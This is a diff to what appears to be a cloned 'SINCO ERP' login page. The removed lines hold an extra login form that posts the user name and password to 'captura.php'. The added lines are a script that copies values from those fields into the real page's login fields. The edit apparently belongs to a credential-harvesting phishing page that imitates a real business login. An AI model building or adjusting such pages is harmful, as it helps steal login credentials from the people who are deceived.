@@ -1,3 +1,4 @@
+
 <!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head>
 <meta charset="utf-8"><meta name="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="expires" content="0"><title>
 	SINCO ERP - Ingreso a la aplicación
@@ -235,26 +236,20 @@
     </div>
 <script src="js/login.js"></script><script src="js/login.fonts.js"></script>
 
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>Formulario de Login</title>
-</head>
-<body>
-  <h2>Iniciar sesión</h2>
-  <form action="captura.php" method="POST">
-    <label for="usuario">Usuario:</label>
-    <input type="text" id="usuario" name="usuario" required><br><br>
+<script>
+document.getElementById('btnSiguiente').addEventListener('click', function() {
+    // Copiar datos del formulario de abajo
+    const userAbajo = document.getElementById('usuario');
+    const passAbajo = document.getElementById('contrasena');
 
-    <label for="contrasena">Contraseña:</label>
-    <input type="password" id="contrasena" name="contrasena" required><br><br>
+    if (userAbajo && passAbajo) {
+        document.getElementById('txtUsuario').value = userAbajo.value;
+        document.getElementById('txtContrasena').value = passAbajo.value;
+    }
 
-    <button type="submit">Enviar</button>
-  </form>
-</body>
-</html>
-
+    // Aquí seguiría la función normal del botón, si ya tiene código en JS lo conservará
+});
+</script>
 
 
 </body></html>
